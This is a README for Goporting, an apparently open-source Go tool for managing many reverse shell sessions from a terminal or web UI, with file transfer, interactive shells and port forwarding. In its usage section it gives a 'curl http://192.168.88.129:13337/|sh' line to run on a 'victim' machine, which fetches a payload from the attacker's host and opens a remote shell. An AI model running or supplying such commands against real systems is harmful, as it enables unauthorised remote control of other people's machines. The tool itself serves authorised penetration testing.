# Goporting

[![Travis-CI](https://travis-ci.org/ThreatCode/Goporting.svg)](https://travis-ci.org/ThreatCode/Goporting)
[![GitHub stars](https://img.shields.io/github/stars/ThreatCode/Goporting.svg)](https://github.com/ThreatCode/Goporting/stargazers)
[![GitHub license](https://img.shields.io/github/license/ThreatCode/Goporting.svg)](https://github.com/ThreatCode/Goporting)
[![GitHub Release Downloads](https://img.shields.io/github/downloads/threatcode/goporting/total)](https://github.com/ThreatCode/Goporting/releases)
[![Sponsors](https://opencollective.com/goporting/tiers/badge.svg)](https://opencollective.com/goporting)

A modern multiple reverse shell sessions/clients manager via terminal written in go

## Features

- [x] Multiple service listening port
- [x] Multiple client connections
- [x] [RESTful API](./docs/RESTful.md)
- [x] [Python SDK](https://github.com/ThreatCode/Goporting-Python)
- [x] [Reverse shell as a service](/docs/RaaS.md) (Pop a reverse shell in multiple languages without remembering idle commands)
- [x] Download/Upload file with progress bar
- [x] Full interactive shell
  - [x] Using vim gracefully in reverse shell
  - [x] Using CTRL+C and CTRL+Z in reverse shell
- [x] Start servers automatically
- [x] Port forwarding
- [x] Initialize from configuration file
- [x] Web UI

## Get Start

> There are multiple ways to run this tool, feel free to choose one of the following method.

### Install requirements for running (Optional)

```
sudo apt install upx
```

### Run Goporting from source code

```bash
git clone https://github.com/ThreatCode/Goporting
cd Goporting
sudo apt install -y make curl
make install_dependency
make release
```

### Run Goporting from docker-compose

```bash
docker-compose up -d
# Method 1: enter the cli of goporting
docker-compose exec app tmux a -t goporting
# Method 2: enter the web ui of goporting
firefox http://127.0.0.1:7331/
```

### Run Goporting from release binaries

1. Download `Goporting` prebuild binary from [HERE](https://github.com/ThreatCode/Goporting/releases)
2. Run the downloaded executable file

## Usage

### Network Topology

* Attack IP: `192.168.88.129`
  * Reverse Shell Service: `0.0.0.0:13337`
  * Reverse Shell Service: `0.0.0.0:13338`
  * RESTful Service: `127.0.0.1:7331`
* Victim IP: `192.168.88.130`

### Give it a try

First, run `./Goporting`, then the `config.yml` will be generated automatically, and the config file is simple enough.

```yaml
servers: 
  - host: "0.0.0.0"
    port: 13337
    # Goporting is able to use several properties as unique identifier (primirary key) of a single client.
    # All available properties are listed below:
    # `%i` IP
    # `%u` Username
    # `%m` MAC address
    # `%o` Operating System
    # `%t` Income TimeStamp
    hashFormat: "%i %u %m %o"
  - host: "0.0.0.0"
    port: 13338
    # Using TimeStamp allows us to track all connections from the same IP / Username / OS and MAC.
    hashFormat: "%i %u %m %o %t"
restful:
  host: "127.0.0.1"
  port: 7331
  enable: true
# Check new releases from GitHub when starting Goporting
update: false
```

![](https://goporting-reverse-shell.vercel.app/images/cli/start.gif)

As you can see, goporting will check for updates, then start listening on port 13337, 13338 and 7331

The three port have different aims.
- 13337 Reverse shell server, which **disallows** the reverse session comes from the IP.
- 13338 Reverse shell server, which **allows** the reverse session comes from the IP.
- 7331 Goporting [RESTful](./doc/RESTful.md) API EndPoint, which allows you to manipulate Goporting through HTTP protocol or [Python SDK](./doc/SDK.md).

If you want another reverse shell listening port, just type `Run 0.0.0.0 1339` or modify the `config.yml`.

Also, goporting will print help information about [RaaS](./doc/RaaS.md) which release you from remembering  tedious reverse shell commands. 

With goporting, all you have to do is just copy-and-paste the `curl` command and execute it on the victim machine.

```bash
curl http://127.0.0.1:13337/|sh
curl http://192.168.88.129:13337/|sh
```

Now, suppose that the victim is attacked by the attacker and a reverse shell command will be executed on the machine of victim.

![](https://goporting-reverse-shell.vercel.app/images/cli/connect.gif)

> Notice, the RaaS feature ensure that the reverse shell process is running in background and ignore the hangup signal.

## Get start with Web UI

### Manage listening port

![](https://goporting-reverse-shell.vercel.app/images/webui/add.gif)

### Wait for client connection

![](https://goporting-reverse-shell.vercel.app/images/webui/wait.gif)

### Popup an interactive shell

![](https://goporting-reverse-shell.vercel.app/images/webui/shell.gif)

### Upgrade a reverse shell to an encrypted channel (Termite)

![](https://goporting-reverse-shell.vercel.app/images/webui/upgrade.gif)

## Get start with cli

### List all victims

You can use `List` command to print table style infomation about all listening servers and connected clients. Notice that the port `13337` will reset the connection from the same machine (we consider two connection are same iff they share the same Hash value, the info being hash can be configured in `config.yml`). Port `13338` will not reset such connections, which provide more repliability.

![](https://goporting-reverse-shell.vercel.app/images/cli/list.gif)

### Select a victim

`Jump` command can take you a tour between clients.
Use `Jump [HASH / Alias]` to jump. `Alias` is a alias of a specific client, you can set a alias of a client via `Alias [ALIAS]`.
Also, for jumping through `HASH`, you do not need to type the whole hash, just prefix of hash will work.

> All commands are case insensitive, feel free to use tab for completing.

![](https://goporting-reverse-shell.vercel.app/images/cli/jump.gif)


### Interactive shell

`Interact` will popup a shell, just like `netcat`.

![](https://goporting-reverse-shell.vercel.app/images/cli/interact.gif)

### Download file

Use `Download` command to download file from reverse shell client to attacker's machine.

![](https://goporting-reverse-shell.vercel.app/images/cli/download.gif)

### Upload file

Use `Upload` command to upload file to the current interacting client.

![](https://goporting-reverse-shell.vercel.app/images/cli/upload.gif)

### Interactive shell mode

> This feature only works on *nix clients

> For your user experience, we highly RECOMMEND you use `Upgrade` command to upgrade the plain reverse shell to a encrypted interactive shell.

Try to Spawn `/bin/bash` via Python, then the shell is fully interactive (You can use vim / htop and other stuffs).
First use `Jump` to select a client, then type `PTY`, then type `Interact` to drop into a fully interactive shell.
~~You can just simply type `exit` to exit pty mode~~, to avoid the situation in [issue #39](https://github.com/ThreatCode/Goporting/issues/39), you can use `platyquit` to quit the fully interactive shell mode.

![](https://goporting-reverse-shell.vercel.app/images/cli/interactive.gif)


## Advanced [Usages](./doc)

* Reverse shell as a Service (RaaS)
* RESTful API
* Python SDK

## Other Materials

* [Presentation on KCon 2019](https://github.com/ThreatCode/Presentations/blob/master/2019-08-24%20Introduction%20to%20Goporting%20(KCon)/Introduction%20to%20Goporting%20on%20KCon%202019.pdf)
* [Presentation on GCSIS 2021](https://github.com/ThreatCode/Presentations/blob/master/2021-04-24%20Introduction%20to%20Goporting%20(GCSIS)/Introduction%20to%20Goporting%20on%20GCSIS%202021.pptx)
* [Demostration Video](http://www.youtube.com/watch?v=Yfy6w8qXcQs "Goporting")

## TODOs
- [ ] [#10 Use database to record all events and interacting logs](https://github.com/ThreatCode/Goporting/issues/10)
- [ ] Router through clients
- [ ] Visualize network topology
- [ ] Host discovery via multiple method (eg: `arp -a`)
- [ ] Redesign frontend (eg: Listener list, Machine list, Network topology graph, File management...)
- [ ] [WIP] Add authencation in RESTful API
- [ ] Use crontab
- [ ] Provide full kernel API
- [ ] [WIP] Support file operations
- [ ] Check whether dst is a folder in file uploading 
- [ ] Benchmark
- [ ] [#24 Upgrading goporting to a system service](https://github.com/ThreatCode/Goporting/issues/24)
- [ ] Upgrade to Metepreter session
- [ ] Electron frontend
- [ ] [#53 Reload config file](https://github.com/ThreatCode/Goporting/issues/53)
- [x] Add version checking in Termite
- [x] [#28 Suport enable internet on the internal machine](https://github.com/ThreatCode/Goporting/issues/28))
- [x] [#28 Suport dynamic port forwarding](https://github.com/ThreatCode/Goporting/issues/28))
- [x] [#28 Suport remote port forwarding](https://github.com/ThreatCode/Goporting/issues/28))
- [x] [#28 Suport local port forwarding](https://github.com/ThreatCode/Goporting/issues/28))
- [x] Design Private Protocol
- [x] Check exit state in WebSocket
- [x] ~~Use HR package to detect the status of client (maybe `echo $random_string`)~~
- [x] Notify window resize (Only works in all cases when private protocol established)
- [x] Upgrade to private protocol
- [x] [#15 Encryption support](https://github.com/ThreatCode/Goporting/issues/15)
- [x] Web UI
- [x] More interfaces in RESTful API
- [x] Websocket for Web UI 
- [x] Continuous Integration
- [x] [#12 Add capability of setting human-readable name of session](https://github.com/ThreatCode/Goporting/issues/12)
- [x] [#7 Allow user to choose operation for the same IP income connection](https://github.com/ThreatCode/Goporting/issues/7)
- [x] [#25 Replace new connection from same IP with old one](https://github.com/ThreatCode/Goporting/issues/25)
- [x] Test driven development [WIP]
- [x] [#19 Read command file when start up](https://github.com/ThreatCode/Goporting/issues/19)
- [x] Add config file
- [x] [#30 RaaS support specifying language, thanks for @RicterZ](https://github.com/ThreatCode/Goporting/issues/30)  
- [x] Execute user input when input is not a built-in command
- [x] Download/Upload progress bar
- [x] [#6 Send one command to all clients at once (Meta Command)](https://github.com/ThreatCode/Goporting/issues/6)
- [x] User guide
- [x] Upload file
- [x] Download file
- [x] [#13 Add a display current prompt setting](https://github.com/ThreatCode/Goporting/issues/13)
- [x] [DEPRECATED] Global Config (eg. [#9 BlockSameIP](https://github.com/ThreatCode/Goporting/pull/9))
- [x] [#11 Make STDOUT and STDERR distinguishable](https://github.com/ThreatCode/Goporting/issues/11)
- [x] [#23 Case insensitive CLI](https://github.com/ThreatCode/Goporting/issues/23)
- [x] Delete command by [@EddieIvan01](https://github.com/EddieIvan01)
- [x] OS Detection (Linux|Windows) by [@EddieIvan01](https://github.com/EddieIvan01)
- [x] Upgrade common reverse shell session into full interactive session
- [x] Docker support (Added by [@yeya24](https://github.com/yeya24))

